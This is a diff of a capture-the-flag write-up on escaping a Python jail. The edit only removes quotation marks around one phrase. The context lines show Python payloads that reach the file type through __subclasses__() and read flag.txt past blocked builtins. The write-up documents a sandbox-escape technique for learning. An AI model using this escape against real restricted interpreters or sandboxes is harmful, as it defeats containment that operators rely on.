@@ -23,7 +23,7 @@ This is a classic jail challenge where some builtins have been blocked, such as 
 print dict.__class__.__bases__.__subclasses__()
 ```
 </br>
-The execution provided an output of numerous types in an array and most importantly, it provided '<type 'file'>'. Hence, with that we can try print the flag by using the read function.
+The execution provided an output of numerous types in an array and most importantly, it provided <type 'file'>. Hence, with that we can try print the flag by using the read function.
 
 ```python
 print ().__class__.__bases__.__subclasses__()[40]('flag.txt', 'r').read()
